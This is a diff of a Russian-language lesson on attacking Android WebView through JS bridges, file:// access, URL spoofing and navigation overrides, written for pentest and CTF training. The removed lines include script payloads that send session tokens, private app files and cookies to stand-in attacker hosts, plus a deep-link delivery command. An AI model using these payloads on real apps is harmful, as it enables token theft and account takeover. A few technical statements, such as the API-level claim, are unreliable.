@@ -14,231 +14,190 @@ useful_for:
 estimated_minutes: 40
 summary: "Продвинутые атаки на WebView: эксплуатация JS-мостов, доступ к file://, спуфинг адресной строки, SSRF из веб-контекста и цепочки до RCE/ATO."
 ---
-## Что делает WebView опасным
 
-WebView — это полноценный браузерный движок внутри приложения. Сам по себе он не уязвимость. Опасность возникает из **сочетания** трёх условий: WebView загружает контент, который атакующий может контролировать (удалённую страницу, deep-link с URL, ответ сервера), в веб-контексте доступны мощные примитивы (JS-мост к нативному коду, доступ к `file://`, доступ к cookies/токенам), и нативные обработчики доверяют веб-контенту (передают секреты, выполняют действия). Когда эти три сходятся, обычный XSS превращается в кражу токенов, обход авторизации и потенциальный RCE.
+## Вопрос, с которого всё начинается
 
-Ментальная модель: **граница между «веб-миром» и «нативным миром» должна быть односторонней и строгой**. Всё, что делает её проницаемой в сторону нативного кода или файловой системы, — потенциальная уязвимость.
+В уроке про WebView мы разобрали основы: JS, файловый доступ, отладка. Но у WebView есть куда более тонкие настройки, и именно они превращают безобидный встроенный браузер в канал выполнения кода. Что нужно проверить, чтобы не пропустить серьёзную уязвимость?
 
-## Полный список опасных настроек
+## Наш пример: WebView в lichess.apk
 
-Проверяйте `WebSettings` и загрузку URL. Каждая из этих строк — красный флаг:
+Возьмём `lichess.apk` — приложение на Flutter, но с нативной WebView для открытия внешних ссылок. Признаки видны по строкам DEX:
+
+```
+$ unzip -o lichess.apk 'classes*.dex' -d lcx
+$ strings lcx/classes.dex | grep -iE 'WebView|loadUrl|setJavaScriptEnabled|WebViewClient' | sort -u
+Landroid/webkit/WebView;
+Landroid/webkit/WebViewClient;
+loadUrl
+setJavaScriptEnabled
+setWebView
+setWebViewClient
+```
+
+Приложение создаёт WebView, включает JavaScript, ставит клиент и грузит URL. Разберём, какие настройки и переопределения надо читать.
+
+## Шаг 1: полный список опасных настроек
+
+Настройки WebView, которые чаще всего приводят к уязвимостям:
+
+- `setJavaScriptEnabled(true)` — без JS многие атаки невозможны, с ним — возможны.
+- `setAllowFileAccess(true)` — доступ к `file://`.
+- `setAllowFileAccessFromFileURLs(true)` — страница из `file://` читает другие `file://`.
+- `setAllowUniversalAccessFromFileURLs(true)` — то же, но без ограничения источника.
+- `setJavaScriptCanOpenWindowsAutomatically(true)` — открытие окон без пользователя.
+- `setDomStorageEnabled(true)` — хранилище в вебе (полезно, но расширяет поверхность).
+
+Комбинация `setAllowUniversalAccessFromFileURLs(true)` + JS — прямой путь к чтению приватных файлов приложения.
+
+## Шаг 2: JS-мост — ядро атаки
+
+`addJavascriptInterface(obj, "Name")` регистрирует Java-объект, доступный из JS как `Name`. Это мост между вебом и приложением. Если объект даёт доступ к файлам, сети или другим данным, XSS на странице вызывает его методы.
+
+Смотрим, что именно открыто:
 
 ```java
-WebSettings s = webView.getSettings();
-s.setJavaScriptEnabled(true);                              // нужен для XSS
-s.setAllowFileAccess(true);                                // file:// доступен
-s.setAllowContentAccess(true);                             // content:// доступен
-s.setAllowFileAccessFromFileURLs(true);                    // file:// читает file://
-s.setAllowUniversalAccessFromFileURLs(true);               // file:// читает ВСЁ (критично)
-s.setAllowFileAccessFromFileURLs(true);
-s.setJavaScriptCanOpenWindowsAutomatically(true);
-webView.addJavascriptInterface(new JsBridge(), "Android"); // мост к нативному коду
-webView.loadUrl(getIntent().getStringExtra("url"));        // загрузка извне
-webView.setWebViewClient(new WebViewClient() {             // нет проверки схем
-    @Override public boolean shouldOverrideUrlLoading(WebView v, String url) { return false; }
-});
+webView.addJavascriptInterface(new FileBridge(), "File");
 ```
 
-Поиск в декомпилированном коде:
+Если `FileBridge` умеет читать файлы по имени, скрипт `File.read("/data/data/.../token")` вернёт секрет. С Android 17 (API 17) методы помечают `@JavascriptInterface`, но это лишь ограничивает набор доступных методов, а не делает мост безопасным.
 
-```bash
-grep -rn "addJavascriptInterface\|setAllowFileAccess\|setAllowUniversalAccess\|setAllowFileAccessFromFileURLs\|setJavaScriptEnabled\|loadUrl\|loadDataWithBaseURL" out_jadx | head -40
-```
+## Шаг 3: доступ к `file://` и universal access
 
-Отдельно ищите `loadDataWithBaseURL` с `baseURL` на чужом домене — это позволяет подгружать локальные ресурсы и обходить origin-политику.
+Опасная комбинация — грузить локальную страницу (`file:///android_asset/page.html`) и разрешать universal access. Тогда любая страница может читать файлы через `file://`. Ещё опаснее — когда приложение подставляет в локальную страницу внешние данные: тогда атакующий управляет содержимым, читающим файлы.
 
-## addJavascriptInterface: как работает мост и его атаки
+Проверяйте, грузит ли приложение `file://`-страницы и включён ли доступ к файлам. В связке с мостом это даёт полный контроль над данными приложения.
 
-`addJavascriptInterface(obj, "name")` открывает JS-код в WebView доступ к публичным методам `obj` через `window.name`. Если WebView грузит удалённую страницу, атакующий через XSS вызывает эти методы.
+## Шаг 4: спуфинг URL
 
-```java
-class JsBridge {
-    @JavascriptInterface
-    public String getToken() { return sessionToken; }        // утечка токена
-    @JavascriptInterface
-    public void saveToFile(String data) { /* запись файла */ } // запись данных
-    @JavascriptInterface
-    public String readFile(String path) { return ...; }       // чтение файлов (RCE-путь)
-}
-```
+Иногда приложение само рисует «адресную строку» или доверяет `getUrl()`. Атака — подсунуть URL, который выглядит доверенным, но ведёт на чужой сайт:
 
-Атака с удалённой страницы:
+- `https://trusted.com@evil.com` — фактический хост `evil.com`.
+- `https://trusted.com.evil.com` — поддомен.
+- `https://evil.com/?trusted.com` — в query.
 
-```html
-<script>
-  // украсть токен
-  fetch('https://attacker.example/steal?t=' + encodeURIComponent(Android.getToken()));
-  // прочитать файл и отправить
-  fetch('https://attacker.example/steal?f=' + encodeURIComponent(Android.readFile('/data/data/com.target.app/files/secret')));
-</script>
-```
+Если приложение проверяет URL по подстроке или `startsWith`, это обходится. Задача — найти, где приложение решает «это доверенный URL» и обмануть проверку.
 
-Ключевые нюансы: методы должны быть помечены `@JavascriptInterface` (на API 17+ иначе недоступны); статические методы/поля тоже доступны; если мост даёт `Runtime.exec` или reflection — это прямой RCE. Даже «безобидный» мост вроде `getDeviceId` утекает PII.
+## Шаг 5: опасные переопределения клиентов
 
-## Доступ к file:// и universal access
+`WebViewClient.shouldOverrideUrlLoading` и `WebChromeClient` управляют навигацией. Опасные паттерны:
 
-`setAllowUniversalAccessFromFileURLs(true)` — самая опасная настройка: страница, загруженная через `file://`, может делать XHR на любой origin, читать локальные файлы и отправлять их наружу. Если атакующий может заставить WebView открыть `file://` с его HTML (через deep link, загрузку файла, `loadUrl` извне), он читает приватные файлы приложения.
+- **Возврат `false` без фильтра** — грузится любой URL.
+- **Открытие новых окон** через `onCreateWindow` без проверки.
+- **Обработка `intent://`** — WebView может запустить внешний Intent.
 
-```html
-<!-- evil.html, открытый через file:// -->
-<script>
-  var x = new XMLHttpRequest();
-  x.open('GET', 'file:///data/data/com.target.app/shared_prefs/auth.xml', false);
-  x.send();
-  fetch('https://attacker.example/steal', {method:'POST', body:x.responseText});
-</script>
-```
+Если `shouldOverrideUrlLoading` не проверяет схему и хост, ссылка из веба открывает что угодно, включая `intent://` для запуска Activity.
 
-Даже без universal access `file://`-навигация на `content://` или `file://` других приложений бывает опасна (обход same-origin через редиректы).
+## Шаг 6: как тестировать
 
-## Спуфинг URL (адресной строки)
+План:
 
-Если приложение показывает пользователю URL из WebView (адресную строку, «вы на сайте банка»), атакующий может её подделать. Классика: URL с `@`, юникод-гомоглифы, длинные пути, `javascript:`-псевдосхемы.
+1. Найти WebView и прочитать все `set*`-настройки рядом.
+2. Найти `addJavascriptInterface` и выписать методы моста.
+3. Найти источники URL для `loadUrl` — контролируются ли снаружи.
+4. Проверить `shouldOverrideUrlLoading` на фильтрацию схем.
+5. Попробовать подсунуть XSS и вызвать мост.
+6. Проверить `setWebContentsDebuggingEnabled` в release.
 
-```
-https://evil.com@www.bank.example/       # реальный хост — evil.com
-https://www.bank.example.evil.com/        # реальный хост — evil.com
-https://www.bаnk.example/                 # 'а' — кириллическая (гомоглиф)
-```
+## Разбор реального сценария
 
-Также встречается спуфинг через `onReceivedTitle` (заголовок страницы подменяет URL) и через `shouldOverrideUrlLoading`, который не проверяет схему и позволяет `intent://`-редиректы на произвольные компоненты.
+Приложение грузит локальную страницу `file:///android_asset/help.html` и включает `setAllowUniversalAccessFromFileURLs(true)`. В страницу подставляется параметр deep link без экранирования. Атакующий передаёт `<script>` с чтением `file:///data/data/com.app/shared_prefs/token.xml` и отправкой содержимого на свой сервер. Из-за universal access скрипт читает приватный файл, а из-за отсутствия экранирования — вообще исполняется. Три настройки по отдельности «нормальны», вместе — утечка токена.
 
-## WebViewClient/WebChromeClient: опасные переопределения
+## Полный прогон от начала до конца
 
-- `onReceivedSslError` с `handler.proceed()` — игнорирует ошибки сертификата → MITM. Это фактически «отключённый TLS».
-- `shouldOverrideUrlLoading` возвращает `false` без фильтра схемы → загрузка `intent://`, `file://`, `content://`.
-- `onJsAlert`/`onJsPrompt` без проверки origin → утечка данных в диалоги.
-- `onPageStarted`/`onPageFinished` показывают URL пользователю → спуфинг.
+Соберём проверку WebView в один сценарий. Сначала `grep` по коду: все вызовы `WebView`, `setJavaScriptEnabled`, `setAllow*`, `addJavascriptInterface`. Читаем настройки и выписываем опасные. Дальше ищем источники URL для `loadUrl` и `loadDataWithBaseURL`. Проверяем `shouldOverrideUrlLoading`: фильтрует ли он схемы. Пробуем подсунуть XSS через внешний параметр и вызвать мост. Проверяем `setWebContentsDebuggingEnabled`. Итог — либо подтверждённая цепочка, либо список замечаний.
 
-```bash
-grep -rn "onReceivedSslError\|proceed()\|shouldOverrideUrlLoading\|onJsPrompt\|onJsAlert" out_jadx | head
-```
+## Частые вопросы
 
-## Разобранный пример: кража токена через XSS в WebView
+**«JavaScript всегда включён?»** — нет, но большинство приложений его включает. **«Что опаснее: мост или `file://`?»** — мост, потому что даёт нативный доступ. **«Как найти мост?»** — grep по `addJavascriptInterface`. **«Что такое спуфинг URL?»** — подмена адреса, чтобы пройти проверку доверия. **«Как защитить?»** — белый список доменов, экранирование, отключение файлового доступа и universal access.
 
-Сценарий: приложение открывает в WebView страницу, URL которой приходит из deep link, JS включён, есть мост `Android` с методом `getToken`, universal access выключен, но удалённый контент грузится.
+## Практический совет
 
-```bash
-# 1. находим точку входа
-grep -rn "loadUrl\|addJavascriptInterface" out_jadx | head
-# → loadUrl(intent.getStringExtra("url")); addJavascriptInterface(bridge, "Android")
+Оценивайте WebView по совокупности, а не по одной настройке. Опасна не `setJavaScriptEnabled(true)` сама по себе, а её сочетание с контролируемым контентом и мостом. Составьте таблицу: настройка → риск → есть ли источник внешнего контента. Так вы быстро отделите реальные цепочки от безобидных конфигураций и не утонете в деталях.
 
-# 2. проверяем deep link в манифесте
-grep -n "scheme\|host" out/AndroidManifest.xml
-# → myapp://open?url=...
+## Ещё один нюанс: WebView и нативный код
 
-# 3. формируем ссылку на наш хост с XSS
-adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.example/evil.html"
-```
+WebView — только один канал. Если приложение на Flutter или React Native, встроенный браузер может быть обёрткой плагина (`flutter_inappwebview`, `react-native-webview`), и настройки задаются в JS/Dart, а не в Java. Тогда `grep` по Java-коду ничего не найдёт, и надо смотреть конфигурацию плагина в бандле или в `libapp.so`. Правило то же: сначала определите фреймворк, потом ищите настройки в правильном слое.
 
-`evil.html` вызывает `Android.getToken()` и отправляет на наш сервер. Токен утёк. Если мост позволяет `readFile`, добавляем эксфильтрацию файлов; если есть reflection — пробуем RCE.
+## Связь с другими уроками
 
-## Справочная таблица опасных API
+WebView deep — промежуточный уровень между базовым WebView и цепочками RCE. Здесь важны детали настроек; в следующем уроке мы разберём, как эти детали складываются в вызов нативного метода через мост. Держите в голове общую картину: вход (deep link), транспорт (WebView), sink (мост). Этот урок — про транспорт и его слабые места.
 
-| API | Риск | Условие эксплуатации |
-|-----|------|----------------------|
-| `addJavascriptInterface` | вызов нативных методов из JS | XSS / удалённый контент |
-| `setAllowUniversalAccessFromFileURLs` | чтение любых файлов | открытие `file://` с evil HTML |
-| `setAllowFileAccessFromFileURLs` | чтение локальных файлов | `file://` навигация |
-| `setAllowFileAccess` | доступ к `file://` | любая загрузка `file://` |
-| `onReceivedSslError`+`proceed` | MITM | любой HTTPS |
-| `shouldOverrideUrlLoading` без фильтра | intent/схема-редирект | контролируемый URL |
-| `loadUrl` из внешнего ввода | загрузка чужого контента | deep link / extra |
-| `loadDataWithBaseURL` | обход origin | подмена baseURL |
+## Итог
 
-## Типовые ошибки новичка
+WebView — это отдельная поверхность атаки внутри приложения, и её опасность складывается из настроек, источников контента и переопределений клиента. Ни одна настройка сама по себе не критична, но их комбинация с контролируемым URL даёт реальные цепочки. Поэтому читайте WebView целиком, а не по одной строке.
 
-- **Считать, что `setJavaScriptEnabled(false)` спасает.** Тогда не работает и сам сайт; а если JS включён — смотрите на мосты и file-access.
-- **Не проверять, откуда приходит URL.** Именно внешний ввод (deep link, push, extra) делает WebView точкой входа.
-- **Игнорировать cookies.** WebView делит `CookieManager` с приложением; XSS может читать/подделывать сессию.
-- **Забыть про нативный контент.** Если мост вызывает нативный код с параметрами, ищите инъекции уже в native (`.so`).
-- **Тестировать только «свой» HTML.** Настоящая эксплуатация — через домен, который приложение реально загружает (часто доверенный, но с XSS).
+## Что мы теперь знаем
 
-## Что дальше / решение
+По-простому:
 
-Порядок: (1) найти все `loadUrl`/`addJavascriptInterface`/file-access-настройки; (2) определить, контролируете ли вы загружаемый контент (deep link, extra, серверный ответ); (3) если да — собрать `evil.html` и проверить вызов моста, чтение `file://`, спуфинг; (4) при наличии нативного моста — перейти в `mobile-android-native`. Связанные уроки: `mobile-webview` (основы), `mobile-intents-deeplinks` (как доставить URL), `mobile-ssl-pinning` (перехват трафика WebView), `mobile-insecure-storage` (что читать через file://). Решение — воспроизводимый PoC: ссылка → утёкший токен/файл.
+1. WebView имеет десятки опасных настроек; читать надо все.
+2. `addJavascriptInterface` — мост, через который XSS зовёт Java.
+3. `file://` + universal access — чтение приватных файлов.
+4. Спуфинг URL обходит наивные проверки хоста.
+5. `shouldOverrideUrlLoading` без фильтра пускает любой URL.
 
-## Продвинутые трюки: обход проверок схем и спуфинг
+## На что смотреть дальше
 
-Приложения часто фильтруют URL (проверяют префикс `https://trusted.example`), но делают это наивно. Обходы:
+- **Читайте все настройки** WebView рядом с его созданием.
+- **Ищите мост** `addJavascriptInterface` и его методы.
+- **Проверяйте источники URL** и фильтрацию схем.
+- **Тестируйте отладку** WebView в release-сборке.
 
-- **Регистр и поддомены:** `https://trusted.example.evil.com` проходит проверку `startsWith("https://trusted.example")`? Нет, но `startsWith("trusted.example")` — да.
-- **userinfo-трюк:** `https://trusted.example@evil.com/` — реальный хост `evil.com`.
-- **Фрагмент и путь:** `https://evil.com/?https://trusted.example` — строка содержит доверенный префикс.
-- **`javascript:`-псевдосхема:** `javascript:fetch('https://attacker/'+document.cookie)` в `loadUrl` исполняется в текущем origin.
-- **`intent:`-схема:** `intent://evil#Intent;scheme=https;package=com.target.app;S.url=...;end` — редирект на произвольный компонент.
-- **`data:` и `about:`** — иногда не фильтруются и дают исполнение.
+## iOS: WKWebView
 
-Для спуфинга адресной строки используйте невидимые Unicode-символы (`U+2028`, RTL-override `U+202E`) и гомоглифы кириллицы/латиницы. Проверка: откройте URL в эмуляторе и посмотрите, как он рендерится в UI приложения.
+На iOS аналог WebView — `WKWebView`. Многие настройки отличаются: вместо `setJavaScriptEnabled` JS включён по умолчанию, а мосты делаются через `WKScriptMessageHandler`. Но принципы те же: недоверенный контент, доступ к файлам, спуфинг URL. Ищите `addScriptMessageHandler` и `loadFileURL` — это iOS-аналоги `addJavascriptInterface` и `file://`. Проверяйте настройки `WKWebViewConfiguration`, в частности `allowFileAccessFromFileURLs` и `allowUniversalAccessFromFileURLs`, которые в WKWebView тоже есть.
 
-## Практический чек-лист тестирования WebView
-
-1. Найдите все `WebView` и их настройки (`grep` выше).
-2. Определите источники URL: deep link, `getIntent().getStringExtra`, push, серверный ответ, локальный файл.
-3. Проверьте `addJavascriptInterface`: какие методы доступны и что они делают.
-4. Проверьте file-access: `setAllowFileAccess*`, `setAllowUniversalAccessFromFileURLs`.
-5. Проверьте `WebViewClient`: `onReceivedSslError`, `shouldOverrideUrlLoading`, обработчики диалогов.
-6. Проверьте cookies (`CookieManager`) — общие ли они с сессией приложения.
-7. Соберите PoC-страницу и доставьте её через реальную точку входа.
-8. Оцените impact: утечка токена, чтение файлов, обход авторизации, RCE.
-
-## Связанные уязвимости и цепочки
-
-WebView редко бывает изолированной находкой. Типовые цепочки: deep link → `loadUrl` → XSS → JS-мост → кража токена → **захват аккаунта** (`mobile-account-takeover`); file-access → чтение `shared_prefs` с токеном → подмена сессии; WebView + `intent:` → открытие внутреннего экрана → обход авторизации (`mobile-intents-deeplinks`). Именно цепочка определяет severity: сам XSS в WebView может быть «low», а цепочка до ATO — «critical».
-
-## Отличия Android WebView и iOS WKWebView
-
-На iOS аналог — `WKWebView` (старый `UIWebView` запрещён). Мосты там реализуются через `WKScriptMessageHandler` (метод `postMessage` из JS), а не `addJavascriptInterface`. Опасность та же: если `WKUserContentController` добавляет обработчик с чувствительными действиями, XSS на удалённой странице вызывает его. `WKPreferences`/`WKWebViewConfiguration` тоже имеют флаги доступа к файлам (`allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs`). На iOS особенно важно проверять `decidePolicyFor navigationAction` — аналог `shouldOverrideUrlLoading`, где решается, загружать ли URL и открывать ли его во внешнем браузере. Проверяйте также `loadFileURL:allowingReadAccessToURL:` — слишком широкий `readAccess` открывает доступ к приватным файлам приложения.
+Итог простой: читайте WebView послойно — настройки, мосты, источники контента, переопределения клиента. Опасность почти всегда в комбинации, а не в отдельной строке.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какая настройка WebView критически опасна с удалённым контентом?"
+- question: "Какой метод регистрирует Java-объект, доступный из JS?"
   options:
-    - "setAllowUniversalAccessFromFileURLs(true)"
-    - "setJavaScriptEnabled(false)"
-    - "setCacheMode"
-    - "setSupportZoom"
+    - "addJavascriptInterface"
+    - "loadUrl"
+    - "setWebViewClient"
+    - "setJavaScriptEnabled"
   answer: 0
-  explanation: "Она разрешает страницам из file:// доступ куда угодно (SSRF/чтение файлов)."
-- question: "Чем опасен addJavascriptInterface с удалённым контентом?"
+- question: "Что даёт `setAllowUniversalAccessFromFileURLs(true)`?"
   options:
-    - "XSS получает доступ к нативным методам моста"
-    - "Он замедляет рендер"
-    - "Он блокирует HTTPS"
-    - "Он удаляет cookies"
+    - "Страница из `file://` читает другие локальные файлы"
+    - "Ускоряет загрузку"
+    - "Включает JavaScript"
+    - "Шифрует трафик"
   answer: 0
-  explanation: "JS-мост превращает XSS в доступ к нативному коду."
-- question: "Как обойти проверку url.startsWith('https://trusted')?"
+- question: "Какая строка URL обманывает наивную проверку по подстроке `trusted.com`?"
   options:
-    - "https://trusted.evil.com"
-    - "https://evil.com/trusted"
-    - "http://trusted"
-    - "https://trusted"
+    - "https://evil.com/?x=trusted.com"
+    - "https://trusted.com/path"
+    - "https://trusted.com"
+    - "ни одна"
   answer: 0
-  explanation: "Суффиксный домен проходит startsWith, но ведёт на чужой хост."
-- question: "К чему ведёт file:// + XSS?"
+- question: "Что делает `shouldOverrideUrlLoading`?"
   options:
-    - "Чтение локальных файлов и SSRF"
-    - "Ускорение WebView"
-    - "Смена сертификата"
-    - "Очистка кэша"
+    - "Управляет навигацией WebView"
+    - "Шифрует URL"
+    - "Включает JS"
+    - "Читает файлы"
   answer: 0
-  explanation: "file-контекст с universal access даёт доступ к файлам и сети."
-- question: "Зачем злоумышленнику спуфинг адресной строки?"
+- question: "Что включает отладку WebView в release?"
   options:
-    - "Чтобы выдать вредоносную страницу за доверенную (фишинг)"
-    - "Чтобы ускорить загрузку"
-    - "Чтобы сжать трафик"
-    - "Чтобы сменить язык"
+    - "setWebContentsDebuggingEnabled(true)"
+    - "setJavaScriptEnabled(true)"
+    - "addJavascriptInterface"
+    - "loadUrl"
   answer: 0
-  explanation: "Подделка URL обманывает пользователя."
 ```
+
+## Куда дальше
+
+Мы разобрали глубокие настройки WebView. В следующем уроке сфокусируемся на **JS-bridge abuse**: как именно злоупотребляют мостами и как достичь недоверенного контента. А пока запомни главное: WebView — это мост, и его настройки решают, что по этому мосту можно пронести.
 
 ## Где пригодится
 
-- **CTF Mobile:** XSS→мост→флаг.
-- **Bug bounty:** кража токенов через WebView.
-- **Пентест:** аудит встроенных браузеров.
-- **Работа:** ревью WebView-настроек.
+- **CTF Mobile:** XSS в WebView → вызов моста.
+- **Bug bounty:** мост с доступом к файлам — серьёзная находка.
+- **Пентест:** глубокий аудит WebView.
+- **Работа:** ревью встроенного браузера.
